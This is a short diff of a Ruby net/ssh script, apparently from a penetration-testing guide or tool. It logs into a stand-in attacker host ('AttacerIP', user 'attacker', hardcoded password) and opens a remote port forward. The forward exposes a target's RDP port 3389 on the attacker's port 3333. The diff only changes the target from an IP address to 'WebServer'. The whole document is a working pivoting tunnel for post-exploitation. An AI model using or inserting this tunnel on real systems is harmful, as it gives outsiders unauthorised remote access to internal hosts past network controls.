@@ -78,7 +78,7 @@ require 'net/ssh'
 
 Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|
 
-  ssh.forward.remote_to(3389, '1.1.1.5', 3333, '0.0.0.0')
+  ssh.forward.remote_to(3389, 'WebServer', 3333, '0.0.0.0')
   
   puts "[+] Starting SSH forward tunnel"
   ssh.loop { true }
